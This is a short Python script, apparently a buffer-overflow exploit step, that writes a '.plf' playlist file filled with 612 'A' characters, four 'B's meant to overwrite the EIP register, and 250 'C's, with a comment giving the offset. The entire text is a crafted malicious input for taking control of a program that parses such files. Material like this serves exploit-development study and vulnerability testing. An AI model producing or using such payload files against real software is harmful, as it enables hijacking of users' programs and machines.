# patter-offset is 612, overwrite EIP with 4 * "B"
buffer = "A"*612 + "B"*4 + "C"*250
f = open('3.plf','w')
f.write(buffer)
f.close()
